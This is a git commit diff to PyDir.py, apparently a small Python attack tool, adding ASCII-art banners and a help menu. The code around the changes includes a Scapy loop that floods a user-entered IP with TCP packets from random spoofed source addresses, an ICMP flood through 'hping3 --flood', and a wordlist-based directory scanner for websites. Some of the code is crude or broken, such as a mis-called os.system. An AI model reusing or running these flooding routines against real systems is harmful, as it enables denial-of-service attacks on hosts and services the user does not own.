70659debc3870133e1d0ae7dd2104b54d1e22e77
Pravardh <62209754+Pravardh@users.noreply.github.com>
2021-10-21 21:54:29 +0400

    Added ASCII art and help menu

--- PyDir.py
+++ PyDir.py
@@ -4,7 +4,7 @@ import os
 import time
 from scapy.all import *
 import multiprocessing
-
+import random
 
 def divide(con,n):
 	n = n/2
@@ -12,7 +12,6 @@ def divide(con,n):
 	newCon = []
 	d = con[n]
 	for i in con:
-
 		if i == d:
 			break
 		else:
@@ -21,15 +20,17 @@ def divide(con,n):
 	return con,newCon
 
 def execute(flags):
+	if '-h' in flags:
+		help()
 	if '-S' in flags:
-			print("Syn flooding!")
+			print("[+] Syn flooding!")
 			synflood()
-				
+
 	if '-s' in flags:
-		direc = input("Enter the location of the wordlist, including the name of the file.\nPress enter to use default wordlist\n")
+		direc = input("[+] Enter the location of the wordlist, including the name of the file.\n[+] Press enter to use default wordlist\n")
 		direc.strip()
 		if direc == "":
-			print("Using default wordlist")
+			print("[+] Using default wordlist")
 			#time.sleep(2)
 			direc = open("wordlist.txt")
 		else:
@@ -68,17 +69,18 @@ def execute(flags):
 		p4.join()
 		finish = time.perf_counter()
 		
-		print(f'Finished in {round(finish-start,2)} second(s)')
+		print(f'[+] Finished in {round(finish-start,2)} second(s)')
 
-
+def help():
+	print("[+] -s: Scan directory of website\n[+] -S SYN flood\n[+] -i ICMP flooding (Requires hping3, only on Linux)\n[+] Combine -q and -s to print only success codes!\n")
+	print("[+] SYNTAX: python3/python PyDir [flag]")
+	print("[+] For the url, please enter it with the protocol. For example: https://www.tritiums.org")
 
 def run(con,t_url,flags,response):
-
-
 	if response.status_code == 200:
 		if '-i' in flags:
-				print("ICMP flooding")
-				n = input("Enter the number of pings requests you would want to use\nNote that some firewalls block ICMP requests. Try SYN flood")
+				print("[+] ICMP flooding")
+				n = input("[+] Enter the number of pings requests you would want to use\nNote that some firewalls block ICMP requests. Try SYN flood")
 				
 		if '-s' in flags:
 			for i in con:
@@ -89,34 +91,92 @@ def run(con,t_url,flags,response):
 
 				if '-q' in flags:
 					if res.status_code == 200:
-						print(f"URL:{url} RESPONSE CODE:{res.status_code}")
+						print(f"[+] URL:{url} RESPONSE CODE:{res.status_code}")
 				else:
-					print(f"URL:{url} RESPONSE CODE:{res.status_code}")
+					print(f"[+] URL:{url} RESPONSE CODE:{res.status_code}")
 
 	else:
-		print("Website is down. Please check url.")
+		print("[+] Website is down. Please check url.")
 		exit()
 
 def icmpflood(ip):
-	print("ICMP flooding!!!")
+	print("[+] ICMP flooding!!!")
 	os.system("hping3 --flood ",ip);
 
 def synflood():
 	#To be worked on!
-	target_ip = input("Enter the IP address\n").strip()
+	target_ip = input("[+] Enter the IP address\n").strip()
 	dport = 80
 	sport = 1234
 	
 	while True:
-
 		s_addr = RandIP()
-		pkt = IP(src=s_addr,dst=target_ip)/TCP(sport = sport,dport=dport,seq = 1505066, flags = "S")
+		pkt = IP(src=s_addr,dst=target_ip)/TCP(sport = sport,dport=dport,seq = 1505066, flags = "A")
 		send(pkt)
 
-
-
-
 if __name__ == "__main__":
+
+	r = random.randint(0,5)
+	print(r)
+
+	if(r == 0):
+		print(r'''	         
+      ___           ___           ___                       ___     
+     /\  \         |\__\         /\  \          ___        /\  \    
+    /::\  \        |:|  |       /::\  \        /\  \      /::\  \   
+   /:/\:\  \       |:|  |      /:/\:\  \       \:\  \    /:/\:\  \  
+  /::\~\:\  \      |:|__|__   /:/  \:\__\      /::\__\  /::\~\:\  \ 
+ /:/\:\ \:\__\     /::::\__\ /:/__/ \:|__|  __/:/\/__/ /:/\:\ \:\__\
+ \/__\:\/:/  /    /:/~~/~    \:\  \ /:/  / /\/:/  /    \/_|::\/:/  /
+      \::/  /    /:/  /       \:\  /:/  /  \::/__/        |:|::/  / 
+       \/__/     \/__/         \:\/:/  /    \:\__\        |:|\/__/  
+                                \::/__/      \/__/        |:|  |    
+                                 ~~                        \|__|
+			''')
+
+	if r == 2:
+		print(r'''
+
+  o__ __o                 o__ __o         o              
+ <|     v\               <|     v\      _<|>_            
+ / \     <\              / \     <\                      
+ \o/     o/   o      o   \o/       \o     o    \o__ __o  
+  |__  _<|/  <|>    <|>   |         |>   <|>    |     |> 
+  |          < >    < >  / \       //    / \   / \   < > 
+ <o>          \o    o/   \o/      /      \o/   \o/       
+  |            v\  /v     |      o        |     |        
+ / \            <\/>     / \  __/>       / \   / \       
+                 /                                       
+                o                                        
+             __/>                                        
+			''')
+
+	if r == 3:
+		print(r'''
+
+ ██▓███ ▓██   ██▓▓█████▄  ██▓ ██▀███  
+▓██░  ██▒▒██  ██▒▒██▀ ██▌▓██▒▓██ ▒ ██▒
+▓██░ ██▓▒ ▒██ ██░░██   █▌▒██▒▓██ ░▄█ ▒
+▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌░██░▒██▀▀█▄  
+▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░██░░██▓ ▒██▒
+▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░
+░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░
+░░       ▒ ▒ ░░   ░ ░  ░  ▒ ░  ░░   ░ 
+         ░ ░        ░     ░     ░     
+         ░ ░      ░                   
+			''')
+
+	if r== 4:
+		print(r''' 
+
+ ▄▀▀▄▀▀▀▄  ▄▀▀▄ ▀▀▄  ▄▀▀█▄▄   ▄▀▀█▀▄    ▄▀▀▄▀▀▀▄ 
+█   █   █ █   ▀▄ ▄▀ █ ▄▀   █ █   █  █  █   █   █ 
+▐  █▀▀▀▀  ▐     █   ▐ █    █ ▐   █  ▐  ▐  █▀▀█▀  
+   █            █     █    █     █      ▄▀    █  
+ ▄▀           ▄▀     ▄▀▄▄▄▄▀  ▄▀▀▀▀▀▄  █     █   
+█             █     █     ▐  █       █ ▐     ▐   
+▐             ▐     ▐        ▐       ▐           
+			''')
 	Uargs = sys.argv
 	Uargs.pop(0)
 	Sargs = ['-s','-i','-h','-k','-q','-S']
@@ -124,7 +184,7 @@ if __name__ == "__main__":
 
 	for i in Uargs:
 		if i not in Sargs:
-			print(f'Flag {i} is invalid. Try again')
+			print(f'[-] Flag {i} is invalid. Try again')
 			exit()
 		else:
 			flags.append(i)
